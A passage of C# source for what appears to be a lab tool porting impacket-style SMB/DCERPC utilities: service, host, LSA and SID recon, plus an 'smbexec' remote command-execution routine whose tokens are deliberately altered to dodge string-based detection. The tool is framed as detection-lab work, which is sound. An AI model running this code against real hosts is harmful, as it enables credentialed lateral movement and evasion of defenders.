        ScHandleResult scm = Svcctl.OpenScManager(pipe, null, ScManagerAccess.Connect);
        if (!scm.Success)
        {
            Console.Error.WriteLine($"OpenSCManager failed: {Svcctl.DescribeWin32(scm.ReturnCode)}");
            return 1;
        }

        ScHandleResult svc = Svcctl.OpenService(pipe, scm.Handle, serviceName, ServiceAccess.QueryConfig);
        if (!svc.Success)
        {
            Console.Error.WriteLine($"OpenService({serviceName}) failed: {Svcctl.DescribeWin32(svc.ReturnCode)}");
            return 1;
        }

        ServiceConfig cfg = Svcctl.QueryServiceConfig(pipe, svc.Handle);
        Svcctl.CloseServiceHandle(pipe, svc.Handle);
        Svcctl.CloseServiceHandle(pipe, scm.Handle);
        pipe.Close();
        client.TreeDisconnect(ipc.TreeId);

        Console.WriteLine($"Service config for {serviceName} on {host}:");
        Console.WriteLine($"  Display name:  {cfg.DisplayName}");
        Console.WriteLine($"  Binary path:   {cfg.BinaryPath}");
        Console.WriteLine($"  Start type:    {cfg.StartTypeName}");
        Console.WriteLine($"  Service type:  0x{cfg.ServiceType:x}");
        Console.WriteLine($"  Logon account: {cfg.StartName}");
        if (!string.IsNullOrEmpty(cfg.Dependencies))
        {
            Console.WriteLine($"  Dependencies:  {cfg.Dependencies}");
        }

        return 0;
    }

    case "rpc-svcstatus":
    {
        // Query one service's live SERVICE_STATUS via svcctl RQueryServiceStatus (opnum 6):
        // run state, accepted control codes, last exit codes.
        if (args.Length < 5)
        {
            Console.Error.WriteLine("usage: rpc-svcstatus <host> <user> <password> <service> [domain] [port]");
            return 2;
        }

        string host = args[1];
        string user = args[2];
        string password = args[3];
        string serviceName = args[4];
        string domain = args.Length >= 6 ? args[5] : string.Empty;
        int port = args.Length >= 7 ? int.Parse(args[6]) : 445;

        using var client = new Smb2Client();
        client.Connect(host, port);
        client.Negotiate();
        Smb2LoginResult login = client.Login(domain, user, password);
        if (!login.Authenticated)
        {
            Console.Error.WriteLine($"Login failed: {NtStatus.Describe(login.Round2Status)}");
            return 1;
        }

        Smb2TreeConnectResult ipc = client.TreeConnect($@"\\{host}\IPC$");
        DcerpcPipe pipe = DcerpcPipe.Open(client, ipc.TreeId, DcerpcInterface.Svcctl.Pipe);
        pipe.Bind(DcerpcInterface.Svcctl);

        ScHandleResult scm = Svcctl.OpenScManager(pipe, null, ScManagerAccess.Connect);
        if (!scm.Success)
        {
            Console.Error.WriteLine($"OpenSCManager failed: {Svcctl.DescribeWin32(scm.ReturnCode)}");
            return 1;
        }

        ScHandleResult svc = Svcctl.OpenService(pipe, scm.Handle, serviceName, ServiceAccess.QueryStatus);
        if (!svc.Success)
        {
            Console.Error.WriteLine($"OpenService({serviceName}) failed: {Svcctl.DescribeWin32(svc.ReturnCode)}");
            return 1;
        }

        ServiceStatus status = Svcctl.QueryServiceStatus(pipe, svc.Handle);
        Svcctl.CloseServiceHandle(pipe, svc.Handle);
        Svcctl.CloseServiceHandle(pipe, scm.Handle);
        pipe.Close();
        client.TreeDisconnect(ipc.TreeId);

        Console.WriteLine($"Service status for {serviceName} on {host}:");
        Console.WriteLine($"  Current state:      {status.State}");
        Console.WriteLine($"  Service type:       0x{status.ServiceType:x}");
        Console.WriteLine($"  Controls accepted:  {status.ControlsAcceptedText}");
        Console.WriteLine($"  Win32 exit code:    {status.Win32ExitCode}");
        if (status.ServiceSpecificExitCode != 0)
        {
            Console.WriteLine($"  Specific exit code: {status.ServiceSpecificExitCode}");
        }
        if (status.CheckPoint != 0 || status.WaitHint != 0)
        {
            Console.WriteLine($"  Checkpoint/wait:    {status.CheckPoint} / {status.WaitHint} ms");
        }

        return 0;
    }

    case "rpc-svcctl":
    {
        // Lab-only: generate the remote service-creation ("psexec") wire signature
        // via svcctl. Opens the SCM, attempts to create a BENIGN marker service,
        // and reports exactly what the server returns. Nothing destructive.
        if (args.Length < 4)
        {
            Console.Error.WriteLine("usage: rpc-svcctl <host> <user> <password> [domain] [port]");
            return 2;
        }

        string host = args[1];
        string user = args[2];
        string password = args[3];
        string domain = args.Length >= 5 ? args[4] : string.Empty;
        int port = args.Length >= 6 ? int.Parse(args[5]) : 445;

        using var client = new Smb2Client();
        client.Connect(host, port);
        client.Negotiate();
        Smb2LoginResult login = client.Login(domain, user, password);
        if (!login.Authenticated)
        {
            Console.Error.WriteLine($"Login failed: {NtStatus.Describe(login.Round2Status)}");
            return 1;
        }

        Smb2TreeConnectResult ipc = client.TreeConnect($@"\\{host}\IPC$");
        DcerpcPipe pipe = DcerpcPipe.Open(client, ipc.TreeId, DcerpcInterface.Svcctl.Pipe);
        pipe.Bind(DcerpcInterface.Svcctl);

        Console.WriteLine($"svcctl on {host} (lab service-control demo):");

        // Try the access psexec requests; fall back to a modest access to still get a handle.
        ScHandleResult scm = Svcctl.OpenScManager(pipe, null, ScManagerAccess.AllAccess);
        Console.WriteLine($"  OpenSCManager(ALL_ACCESS):  {Svcctl.DescribeWin32(scm.ReturnCode)}");
        if (!scm.Success)
        {
            scm = Svcctl.OpenScManager(pipe, null, ScManagerAccess.Connect | ScManagerAccess.EnumerateService);
            Console.WriteLine($"  OpenSCManager(CONNECT):     {Svcctl.DescribeWin32(scm.ReturnCode)}");
        }

        if (scm.Success)
        {
            const string serviceName = "DotNetPacketLab";
            const string binaryPath = @"%SystemRoot%\System32\cmd.exe /c echo netpacket-lab-marker";
            try
            {
                ScHandleResult created = Svcctl.CreateService(
                    pipe, scm.Handle, serviceName, "DotNetPacket Lab Marker", binaryPath);
                Console.WriteLine($"  CreateService(\"{serviceName}\"): {Svcctl.DescribeWin32(created.ReturnCode)}");

                if (created.Success)
                {
                    // Clean up immediately — do not leave a service behind.
                    uint del = Svcctl.DeleteService(pipe, created.Handle);
                    Console.WriteLine($"  DeleteService (cleanup):    {Svcctl.DescribeWin32(del)}");
                    Svcctl.CloseServiceHandle(pipe, created.Handle);
                }
            }
            catch (DcerpcFaultException fault)
            {
                // e.g. Samba answers CreateServiceW with nca_op_rng_error (unimplemented) —
                // the request still went on the wire; that is the signature of interest.
                Console.WriteLine($"  CreateService(\"{serviceName}\"): DCERPC fault 0x{fault.Status:X8} (rejected/unsupported by server)");
            }

            uint closed = Svcctl.CloseServiceHandle(pipe, scm.Handle);
            Console.WriteLine($"  CloseServiceHandle:         {Svcctl.DescribeWin32(closed)}");
        }

        pipe.Close();
        client.TreeDisconnect(ipc.TreeId);
        return 0;
    }

    case "smbexec":
    {
        // smbexec.py (SHARE mode, cmd shell): run a command on the target by creating a
        // one-shot svcctl service whose binary path is a %COMSPEC% line that redirects its
        // output to a file on a readable share, then grab that file back. Lab-only exec
        // primitive — observable by design (prints the crafted service binary path, the
        // random service/batch/output names, and every SCM return code). Self-cleaning:
        // the service is deleted immediately and the output file removed after reading.
        if (args.Length < 5)
        {
            Console.Error.WriteLine("usage: smbexec <host> <user> <password> <command> [share=C$] [domain] [port]");
            return 2;
        }

        string host = args[1];
        string user = args[2];
        string password = args[3];
        string command = args[4];
        string share = args.Length >= 6 ? args[5] : "C$";
        string domain = args.Length >= 7 ? args[6] : string.Empty;
        int port = args.Length >= 8 ? int.Parse(args[7]) : 445;

        var rng = new Random();
        string serviceName = SmbExecCommand.ServiceName(rng);
        string outputFilename = SmbExecCommand.OutputFilename(rng);
        string scriptFile = SmbExecCommand.ScriptFile(rng);
        string binaryPath = SmbExecCommand.BuildCmd(command, share, outputFilename, scriptFile);

        using var client = new Smb2Client();
        client.Connect(host, port);
        client.Negotiate();
        Smb2LoginResult login = client.Login(domain, user, password);
        if (!login.Authenticated)
        {
            Console.Error.WriteLine($"Login failed: {NtStatus.Describe(login.Round2Status)}");
            return 1;
        }

        Smb2TreeConnectResult ipc = client.TreeConnect($@"\\{host}\IPC$");
        DcerpcPipe pipe = DcerpcPipe.Open(client, ipc.TreeId, DcerpcInterface.Svcctl.Pipe);
        pipe.Bind(DcerpcInterface.Svcctl);

        Console.WriteLine($"smbexec on {host} (SHARE mode, share={share}):");
        Console.WriteLine($"  service name:   {serviceName}");
        Console.WriteLine($"  output file:    {share}\\{outputFilename}");
        // Behaviour matches smbexec; the string tokens deliberately differ from impacket's
        // (cmd.exe vs %COMSPEC% /Q /c, %TEMP%\...cmd vs %SYSTEMROOT%\...bat, no __output_ prefix)
        // so a brittle string IOC won't catch this port — see docs/WIRE_DIFF.md.
        Console.WriteLine($"  service binPath (behaviour of smbexec, DotNetPacket fingerprint):");
        Console.WriteLine($"    {binaryPath}");

        ScHandleResult scm = Svcctl.OpenScManager(pipe, null, ScManagerAccess.AllAccess);
        Console.WriteLine($"  OpenSCManager:  {Svcctl.DescribeWin32(scm.ReturnCode)}");
        if (!scm.Success)
        {
            Console.Error.WriteLine("  Could not open the SCM; aborting.");
            pipe.Close();
            client.TreeDisconnect(ipc.TreeId);
            return 1;
        }

        bool serviceCreated = false;
        try
        {
            // smbexec leaves dwErrorControl at SERVICE_ERROR_NORMAL and sets SERVICE_DEMAND_START.
            ScHandleResult created = Svcctl.CreateService(
                pipe, scm.Handle, serviceName, serviceName, binaryPath,
                startType: ServiceConstants.StartDemand,
                errorControl: ServiceConstants.ErrorNormal);
            Console.WriteLine($"  CreateService:  {Svcctl.DescribeWin32(created.ReturnCode)}");

            if (created.Success)
            {
                serviceCreated = true;

                // The service is bogus (a cmd line, not a real service), so StartServiceW is
                // expected to fail/time out — smbexec ignores that; the command still runs.
                try
                {
                    uint start = Svcctl.StartService(pipe, created.Handle);
                    Console.WriteLine($"  StartService:   {Svcctl.DescribeWin32(start)} (a cmd line is not a real service; failure is expected)");
                }
                catch (DcerpcFaultException fault)
                {
                    Console.WriteLine($"  StartService:   DCERPC fault 0x{fault.Status:X8} (expected — not a real service)");
                }

                uint del = Svcctl.DeleteService(pipe, created.Handle);
                Console.WriteLine($"  DeleteService:  {Svcctl.DescribeWin32(del)}");
                Svcctl.CloseServiceHandle(pipe, created.Handle);
            }
        }
        catch (DcerpcFaultException fault)
        {
            // Samba does not implement RCreateServiceW for arbitrary binaries; the request still
            // went on the wire (the signature of interest). Reported, not fatal.
            Console.WriteLine($"  CreateService:  DCERPC fault 0x{fault.Status:X8} (rejected/unsupported by server)");
        }

        Svcctl.CloseServiceHandle(pipe, scm.Handle);
        pipe.Close();
        client.TreeDisconnect(ipc.TreeId);

        // Grab the command output off the share, then delete it.
        if (serviceCreated)
        {
            try
            {
                Smb2TreeConnectResult outTree = client.TreeConnect($@"\\{host}\{share}");
                try
                {
                    byte[] output = client.ReadFile(outTree.TreeId, outputFilename);
                    Console.WriteLine("  --- command output ---");
                    Console.WriteLine(System.Text.Encoding.UTF8.GetString(output).TrimEnd());
                    Console.WriteLine("  ----------------------");
                    client.DeleteFile(outTree.TreeId, outputFilename);
                }
                finally
                {
                    client.TreeDisconnect(outTree.TreeId);
                }
            }
            catch (IOException)
            {
                // No output file: the target never executed the cmd line (e.g. Samba — no
                // Windows SCM/cmd.exe behind svcctl). The service-creation signature is still
                // what a SOC would detect; the execution leg needs a Windows target.
                Console.WriteLine($"  (no output file on {share} — the target did not execute the command; see notes)");
            }
        }

        return 0;
    }

    case "rpc-hostinfo":
    {
        // Host/OS recon via wkssvc NetrWkstaGetInfo + srvsvc NetrServerGetInfo.
        if (args.Length < 4)
        {
            Console.Error.WriteLine("usage: rpc-hostinfo <host> <user> <password> [domain] [port]");
            return 2;
        }

        string host = args[1];
        string user = args[2];
        string password = args[3];
        string domain = args.Length >= 5 ? args[4] : string.Empty;
        int port = args.Length >= 6 ? int.Parse(args[5]) : 445;

        using var client = new Smb2Client();
        client.Connect(host, port);
        client.Negotiate();
        Smb2LoginResult login = client.Login(domain, user, password);
        if (!login.Authenticated)
        {
            Console.Error.WriteLine($"Login failed: {NtStatus.Describe(login.Round2Status)}");
            return 1;
        }

        Smb2TreeConnectResult ipc = client.TreeConnect($@"\\{host}\IPC$");

        DcerpcPipe wkssvc = DcerpcPipe.Open(client, ipc.TreeId, DcerpcInterface.Wkssvc.Pipe);
        wkssvc.Bind(DcerpcInterface.Wkssvc);
        WkstaInfo100 wksta = Wkssvc.NetrWkstaGetInfo(wkssvc);
        wkssvc.Close();

        DcerpcPipe srvsvc = DcerpcPipe.Open(client, ipc.TreeId, DcerpcInterface.Srvsvc.Pipe);
        srvsvc.Bind(DcerpcInterface.Srvsvc);
        ServerInfo101 server = Srvsvc.NetrServerGetInfo(srvsvc);
        srvsvc.Close();

        client.TreeDisconnect(ipc.TreeId);

        Console.WriteLine($"Host info for {host}:");
        Console.WriteLine("  wkssvc NetrWkstaGetInfo(100):");
        Console.WriteLine($"    ComputerName: {wksta.ComputerName}");
        Console.WriteLine($"    Domain/Group: {wksta.LanGroup}");
        Console.WriteLine($"    OS version:   {wksta.VersionMajor}.{wksta.VersionMinor} (platform {wksta.PlatformId})");
        Console.WriteLine("  srvsvc NetrServerGetInfo(101):");
        Console.WriteLine($"    Name:         {server.Name}");
        Console.WriteLine($"    OS version:   {server.VersionMajor}.{server.VersionMinor}");
        Console.WriteLine($"    Server type:  0x{server.Type:x8}");
        Console.WriteLine($"    Comment:      {server.Comment}");
        return 0;
    }

    case "rpc-srvinfo":
    {
        // Server info via srvsvc NetrServerGetInfo level 102: the 101 fields plus the server's
        // announce/session tunables (user limit, auto-disconnect, hidden, announce, licenses, path).
        if (args.Length < 4)
        {
            Console.Error.WriteLine("usage: rpc-srvinfo <host> <user> <password> [domain] [port]");
            return 2;
        }

        string host = args[1];
        string user = args[2];
        string password = args[3];
        string domain = args.Length >= 5 ? args[4] : string.Empty;
        int port = args.Length >= 6 ? int.Parse(args[5]) : 445;

        using var client = new Smb2Client();
        client.Connect(host, port);
        client.Negotiate();
        Smb2LoginResult login = client.Login(domain, user, password);
        if (!login.Authenticated)
        {
            Console.Error.WriteLine($"Login failed: {NtStatus.Describe(login.Round2Status)}");
            return 1;
        }

        Smb2TreeConnectResult ipc = client.TreeConnect($@"\\{host}\IPC$");
        DcerpcPipe srvsvc = DcerpcPipe.Open(client, ipc.TreeId, DcerpcInterface.Srvsvc.Pipe);
        srvsvc.Bind(DcerpcInterface.Srvsvc);
        ServerInfo102 server = Srvsvc.NetrServerGetInfo102(srvsvc);
        srvsvc.Close();
        client.TreeDisconnect(ipc.TreeId);

        Console.WriteLine($"srvsvc NetrServerGetInfo(102) for {host}:");
        Console.WriteLine($"  Name:         {server.Name}");
        Console.WriteLine($"  OS version:   {server.VersionMajor}.{server.VersionMinor} (platform {server.PlatformId})");
        Console.WriteLine($"  Server type:  0x{server.Type:x8}");
        Console.WriteLine($"  Comment:      {server.Comment}");
        Console.WriteLine($"  Users (max):  {(server.Users == 0xFFFFFFFF ? "unlimited" : server.Users.ToString())}");
        Console.WriteLine($"  Auto-disc:    {server.Disc}");
        Console.WriteLine($"  Hidden:       {server.Hidden}");
        Console.WriteLine($"  Announce:     {server.Announce} (delta {server.AnnDelta})");
        Console.WriteLine($"  Licenses:     {server.Licenses}");
        Console.WriteLine($"  User path:    {server.UserPath}");
        return 0;
    }

    case "rpc-lsa":
    {
        // Domain recon via lsarpc: open the LSA policy and read the account domain + SID.
        if (args.Length < 4)
        {
            Console.Error.WriteLine("usage: rpc-lsa <host> <user> <password> [domain] [port]");
            return 2;
        }

        string host = args[1];
        string user = args[2];
        string password = args[3];
        string domain = args.Length >= 5 ? args[4] : string.Empty;
        int port = args.Length >= 6 ? int.Parse(args[5]) : 445;

        using var client = new Smb2Client();
        client.Connect(host, port);
        client.Negotiate();
        Smb2LoginResult login = client.Login(domain, user, password);
        if (!login.Authenticated)
        {
            Console.Error.WriteLine($"Login failed: {NtStatus.Describe(login.Round2Status)}");
            return 1;
        }

        Smb2TreeConnectResult ipc = client.TreeConnect($@"\\{host}\IPC$");
        DcerpcPipe pipe = DcerpcPipe.Open(client, ipc.TreeId, DcerpcInterface.Lsarpc.Pipe);
        pipe.Bind(DcerpcInterface.Lsarpc);

        ScHandleResult policy = Lsarpc.OpenPolicy2(pipe);
        Console.WriteLine($"LSA policy on {host}:");
        Console.WriteLine($"  OpenPolicy2: {(policy.Success ? "OK" : $"0x{policy.ReturnCode:X8}")}");
        if (policy.Success)
        {
            LsaAccountDomain account = Lsarpc.QueryAccountDomain(pipe, policy.Handle);
            Console.WriteLine($"  Account domain: {account.Name}");
            Console.WriteLine($"  Account SID:    {account.Sid}");

            // Primary domain (QueryInformationPolicy class 3): the domain the host is a member of.
            LsaAccountDomain primary = Lsarpc.QueryPrimaryDomain(pipe, policy.Handle);
            if (primary.Success && !string.IsNullOrEmpty(primary.Name))
            {
                Console.WriteLine($"  Primary domain: {primary.Name}");
                Console.WriteLine($"  Primary SID:    {primary.Sid}");
            }

            // DNS/forest identity (QueryInformationPolicy2 level 12) — only a DC answers.
            try
            {
                LsaDnsDomain dns = Lsarpc.QueryDnsDomain(pipe, policy.Handle);
                if (dns.Success && !string.IsNullOrEmpty(dns.DnsDomainName))
                {
                    Console.WriteLine($"  DNS domain:     {dns.DnsDomainName}");
                    Console.WriteLine($"  DNS forest:     {dns.DnsForestName}");
                    Console.WriteLine($"  Domain GUID:    {dns.DomainGuid}");
                    Console.WriteLine($"  Domain SID:     {dns.Sid}");
                }
            }
            catch (DcerpcFaultException)
            {
                // Not a DC (standalone servers fault on level 12) — account-domain info stands.
            }

            Lsarpc.Close(pipe, policy.Handle);
        }

        pipe.Close();
        client.TreeDisconnect(ipc.TreeId);
        return 0;
    }

    case "rpc-privs":
    {
        // Enumerate the privileges the LSA knows via lsarpc LsarEnumeratePrivileges
        // (the enum4linux privilege-enumeration recon).
        if (args.Length < 4)
        {
            Console.Error.WriteLine("usage: rpc-privs <host> <user> <password> [domain] [port]");
            return 2;
        }

        string host = args[1];
        string user = args[2];
        string password = args[3];
        string domain = args.Length >= 5 ? args[4] : string.Empty;
        int port = args.Length >= 6 ? int.Parse(args[5]) : 445;

        using var client = new Smb2Client();
        client.Connect(host, port);
        client.Negotiate();
        Smb2LoginResult login = client.Login(domain, user, password);
        if (!login.Authenticated)
        {
            Console.Error.WriteLine($"Login failed: {NtStatus.Describe(login.Round2Status)}");
            return 1;
        }

        Smb2TreeConnectResult ipc = client.TreeConnect($@"\\{host}\IPC$");
        DcerpcPipe pipe = DcerpcPipe.Open(client, ipc.TreeId, DcerpcInterface.Lsarpc.Pipe);
        pipe.Bind(DcerpcInterface.Lsarpc);

        ScHandleResult policy = Lsarpc.OpenPolicy2(pipe);
        if (!policy.Success)
        {
            Console.Error.WriteLine($"OpenPolicy2 failed: 0x{policy.ReturnCode:X8}");
            return 1;
        }

        IReadOnlyList<LsaPrivilege> privs = Lsarpc.EnumeratePrivileges(pipe, policy.Handle);
        Lsarpc.Close(pipe, policy.Handle);
        pipe.Close();
        client.TreeDisconnect(ipc.TreeId);

        Console.WriteLine($"LSA privileges on {host} (via LsarEnumeratePrivileges, {privs.Count}):");
        foreach (LsaPrivilege p in privs)
        {
            Console.WriteLine($"  LUID {p.LuidHigh}:{p.LuidLow,-4} {p.Name}");
        }

        return 0;
    }

    case "rpc-accountrights":
    {
        // List the LSA rights/privileges granted to one account SID via lsarpc
        // LsarEnumerateAccountRights (the "who can do what" recon behind tools that
        // audit SeDebugPrivilege/SeBackupPrivilege holders).
        if (args.Length < 5)
        {
            Console.Error.WriteLine("usage: rpc-accountrights <host> <user> <password> <sid> [domain] [port]");
            Console.Error.WriteLine("  e.g. rpc-accountrights 127.0.0.1 Administrator 'pass' S-1-5-32-550 LAB");
            return 2;
        }

        string host = args[1];
        string user = args[2];
        string password = args[3];
        string sid = args[4];
        string domain = args.Length >= 6 ? args[5] : string.Empty;
        int port = args.Length >= 7 ? int.Parse(args[6]) : 445;

        using var client = new Smb2Client();
        client.Connect(host, port);
        client.Negotiate();
        Smb2LoginResult login = client.Login(domain, user, password);
        if (!login.Authenticated)
        {
            Console.Error.WriteLine($"Login failed: {NtStatus.Describe(login.Round2Status)}");
            return 1;
        }

        Smb2TreeConnectResult ipc = client.TreeConnect($@"\\{host}\IPC$");
        DcerpcPipe pipe = DcerpcPipe.Open(client, ipc.TreeId, DcerpcInterface.Lsarpc.Pipe);
        pipe.Bind(DcerpcInterface.Lsarpc);

        ScHandleResult policy = Lsarpc.OpenPolicy2(pipe);
        if (!policy.Success)
        {
            Console.Error.WriteLine($"OpenPolicy2 failed: 0x{policy.ReturnCode:X8}");
            return 1;
        }

        LsaAccountRights rights = Lsarpc.EnumerateAccountRights(pipe, policy.Handle, sid);
        Lsarpc.Close(pipe, policy.Handle);
        pipe.Close();
        client.TreeDisconnect(ipc.TreeId);

        if (rights.NotFound)
        {
            Console.WriteLine($"{sid}: no LSA account object (no rights directly assigned).");
            return 0;
        }

        if (!rights.Success)
        {
            Console.Error.WriteLine($"LsarEnumerateAccountRights failed: 0x{rights.Status:X8}");
            return 1;
        }

        Console.WriteLine($"Account rights for {sid} on {host} ({rights.Rights.Count}):");
        foreach (string r in rights.Rights)
        {
            Console.WriteLine($"  {r}");
        }

        return 0;
    }

    case "rpc-privlookup":
    {
        // Resolve a privilege name <-> its LUID via lsarpc LsarLookupPrivilegeValue (opnum 31)
        // and LsarLookupPrivilegeName (opnum 32). Pass a name (e.g. SeDebugPrivilege) to get the
        // LUID and confirm with the reverse lookup; pass a number to resolve a LUID to its name.
        if (args.Length < 5)
        {
            Console.Error.WriteLine("usage: rpc-privlookup <host> <user> <password> <privilege-name|luid> [domain] [port]");
            Console.Error.WriteLine("  e.g. rpc-privlookup 127.0.0.1 Administrator 'pass' SeDebugPrivilege LAB");
            Console.Error.WriteLine("       rpc-privlookup 127.0.0.1 Administrator 'pass' 20 LAB");
            return 2;
        }

        string host = args[1];
        string user = args[2];
        string password = args[3];
        string target = args[4];
        string domain = args.Length >= 6 ? args[5] : string.Empty;
        int port = args.Length >= 7 ? int.Parse(args[6]) : 445;

        using var client = new Smb2Client();
        client.Connect(host, port);
        client.Negotiate();
        Smb2LoginResult login = client.Login(domain, user, password);
        if (!login.Authenticated)
        {
            Console.Error.WriteLine($"Login failed: {NtStatus.Describe(login.Round2Status)}");
            return 1;
        }

        Smb2TreeConnectResult ipc = client.TreeConnect($@"\\{host}\IPC$");
        DcerpcPipe pipe = DcerpcPipe.Open(client, ipc.TreeId, DcerpcInterface.Lsarpc.Pipe);
        pipe.Bind(DcerpcInterface.Lsarpc);

        ScHandleResult policy = Lsarpc.OpenPolicy2(pipe);
        if (!policy.Success)
        {
            Console.Error.WriteLine($"OpenPolicy2 failed: 0x{policy.ReturnCode:X8}");
            return 1;
        }

        int exit = 0;
        if (uint.TryParse(target, out uint luidLow))
        {
            // LUID -> name
            (string name, uint status) = Lsarpc.LookupPrivilegeName(pipe, policy.Handle, luidLow, 0);
            if (status == 0)
            {
                Console.WriteLine($"LUID {luidLow} -> {name}");
            }
            else
            {
                Console.Error.WriteLine($"LookupPrivilegeName(LUID {luidLow}) failed: 0x{status:X8}");
                exit = 1;
            }
        }
        else
        {
            // name -> LUID, then confirm with the reverse lookup
            (uint low, int high, uint status) = Lsarpc.LookupPrivilegeValue(pipe, policy.Handle, target);
            if (status == 0)
            {
                Console.WriteLine($"{target} -> LUID {high}:{low}");
                (string back, uint rstatus) = Lsarpc.LookupPrivilegeName(pipe, policy.Handle, low, high);
                if (rstatus == 0)
                {
                    Console.WriteLine($"  reverse: LUID {high}:{low} -> {back}");
                }
                (string display, _, uint dstatus) = Lsarpc.LookupPrivilegeDisplayName(pipe, policy.Handle, target);
                if (dstatus == 0 && !string.IsNullOrEmpty(display))
                {
                    Console.WriteLine($"  display: \"{display}\"");
                }
            }
            else
            {
                Console.Error.WriteLine($"LookupPrivilegeValue({target}) failed: 0x{status:X8}");
                exit = 1;
            }
        }

        Lsarpc.Close(pipe, policy.Handle);
        pipe.Close();
        client.TreeDisconnect(ipc.TreeId);
        return exit;
    }

    case "rpc-lookupsid":
    {
        // SID->name recon via lsat LsarLookupSids (the lookupsid behavior).
        if (args.Length < 4)
        {
            Console.Error.WriteLine("usage: rpc-lookupsid <host> <user> <password> [domain] [port]");
            return 2;
        }

        string host = args[1];
        string user = args[2];
        string password = args[3];
        string domain = args.Length >= 5 ? args[4] : string.Empty;
        int port = args.Length >= 6 ? int.Parse(args[5]) : 445;

        using var client = new Smb2Client();
        client.Connect(host, port);
        client.Negotiate();
        Smb2LoginResult login = client.Login(domain, user, password);
        if (!login.Authenticated)
        {
            Console.Error.WriteLine($"Login failed: {NtStatus.Describe(login.Round2Status)}");
            return 1;
        }

        Smb2TreeConnectResult ipc = client.TreeConnect($@"\\{host}\IPC$");
        DcerpcPipe pipe = DcerpcPipe.Open(client, ipc.TreeId, DcerpcInterface.Lsarpc.Pipe);
        pipe.Bind(DcerpcInterface.Lsarpc);

        ScHandleResult policy = Lsarpc.OpenPolicy2(pipe);
        LsaAccountDomain account = Lsarpc.QueryAccountDomain(pipe, policy.Handle);

        // Well-known SIDs plus a few account-domain RIDs (classic lookupsid recon).
        var sids = new List<string> { "S-1-5-32-544", "S-1-5-32-545", "S-1-1-0", "S-1-5-18" };
        if (!string.IsNullOrEmpty(account.Sid))
        {
            foreach (int rid in new[] { 500, 501, 512, 513 })
            {
                sids.Add($"{account.Sid}-{rid}");
            }
        }

        IReadOnlyList<LsaResolvedSid> resolved = Lsat.LookupSids(pipe, policy.Handle, sids);
        Lsarpc.Close(pipe, policy.Handle);
        pipe.Close();
        client.TreeDisconnect(ipc.TreeId);

        Console.WriteLine($"SID lookups on {host} (account domain {account.Name} = {account.Sid}):");
        foreach (LsaResolvedSid r in resolved)
        {
            bool ok = r.Use != SidNameUse.Unknown && r.Use != SidNameUse.Invalid && !string.IsNullOrEmpty(r.Name);
            string label = ok ? $"{r.Display} ({r.Use})" : "(unresolved)";
            Console.WriteLine($"  {r.InputSid,-48} {label}");
        }

        return 0;
    }

    case "rpc-lookupsid2":
    {
        // SID->name recon via lsat LsarLookupSids2 (opnum 57) — the variant modern Windows
        // clients use (adds LookupOptions + ClientRevision; EX translated-name records).
        if (args.Length < 4)
        {
            Console.Error.WriteLine("usage: rpc-lookupsid2 <host> <user> <password> [domain] [port]");
            return 2;
        }

        string host = args[1];
        string user = args[2];
        string password = args[3];
        string domain = args.Length >= 5 ? args[4] : string.Empty;
        int port = args.Length >= 6 ? int.Parse(args[5]) : 445;

        using var client = new Smb2Client();
        client.Connect(host, port);
        client.Negotiate();
        Smb2LoginResult login = client.Login(domain, user, password);
        if (!login.Authenticated)
        {
            Console.Error.WriteLine($"Login failed: {NtStatus.Describe(login.Round2Status)}");
            return 1;
        }

        Smb2TreeConnectResult ipc = client.TreeConnect($@"\\{host}\IPC$");
        DcerpcPipe pipe = DcerpcPipe.Open(client, ipc.TreeId, DcerpcInterface.Lsarpc.Pipe);
        pipe.Bind(DcerpcInterface.Lsarpc);

        ScHandleResult policy = Lsarpc.OpenPolicy2(pipe);
        LsaAccountDomain account = Lsarpc.QueryAccountDomain(pipe, policy.Handle);

        var sids = new List<string> { "S-1-5-32-544", "S-1-5-32-545", "S-1-1-0", "S-1-5-18" };
        if (!string.IsNullOrEmpty(account.Sid))
        {
            foreach (int rid in new[] { 500, 501, 512, 513 })
            {
                sids.Add($"{account.Sid}-{rid}");
            }
        }

        IReadOnlyList<LsaResolvedSid> resolved = Lsat.LookupSids2(pipe, policy.Handle, sids);
        Lsarpc.Close(pipe, policy.Handle);
        pipe.Close();
        client.TreeDisconnect(ipc.TreeId);

        Console.WriteLine($"SID lookups (LookupSids2) on {host} (account domain {account.Name} = {account.Sid}):");
        foreach (LsaResolvedSid r in resolved)
        {
            bool ok = r.Use != SidNameUse.Unknown && r.Use != SidNameUse.Invalid && !string.IsNullOrEmpty(r.Name);
            string label = ok ? $"{r.Display} ({r.Use})" : "(unresolved)";
            Console.WriteLine($"  {r.InputSid,-48} {label}");
        }

        return 0;
    }

    case "rpc-changepw":
    {
        // changepasswd.py (SAMR / NetUserChangePassword path): a user changes their OWN password
        // over SAMR via SamrUnicodeChangePasswordUser2 — proving the old password, no admin rights.
        // Benign (normal password change). Authenticates the SMB session with the old password.
        if (args.Length < 5)
        {
            Console.Error.WriteLine("usage: rpc-changepw <host> <user> <oldpassword> <newpassword> [domain] [port]");
            return 2;
        }

        string host = args[1];
        string user = args[2];
        string oldPassword = args[3];
        string newPassword = args[4];
        string domain = args.Length >= 6 ? args[5] : string.Empty;
        int port = args.Length >= 7 ? int.Parse(args[6]) : 445;

        using var client = new Smb2Client();
        client.Connect(host, port);
        client.Negotiate();
        Smb2LoginResult login = client.Login(domain, user, oldPassword);
        if (!login.Authenticated)
        {
            Console.Error.WriteLine($"Login failed: {NtStatus.Describe(login.Round2Status)}");
            return 1;
        }

        Smb2TreeConnectResult ipc = client.TreeConnect($@"\\{host}\IPC$");
        DcerpcPipe pipe = DcerpcPipe.Open(client, ipc.TreeId, DcerpcInterface.Samr.Pipe);
        pipe.Bind(DcerpcInterface.Samr);

        Console.WriteLine($"changepasswd (SAMR) on {host}: changing password for {user}");
        uint rc = Samr.UnicodeChangePasswordUser2(pipe, user, oldPassword, newPassword);
        if (rc == NtStatus.Success)
        {
            Console.WriteLine($"[+] Password for {user} changed via SamrUnicodeChangePasswordUser2.");
            return 0;
        }

        Console.Error.WriteLine($"[-] SamrUnicodeChangePasswordUser2 failed: {NtStatus.Describe(rc)}");
        return 1;
    }

    case "atexec":
    {
        // atexec.py: remote command execution via the Task Scheduler (MS-TSCH over \atsvc).
        // Registers a task that runs `cmd.exe /C <command> > %windir%\Temp\<tmp> 2>&1`, runs it,
        // waits, reads the output from ADMIN$\Temp over SMB, then deletes the task + output file.
        // LAB-ONLY exec primitive. Windows-only on the wire: Samba does not implement MS-TSCH, so
        // against this lab the \atsvc bind fails (reported) — validate end-to-end on a Windows target.
        if (args.Length < 5)
        {
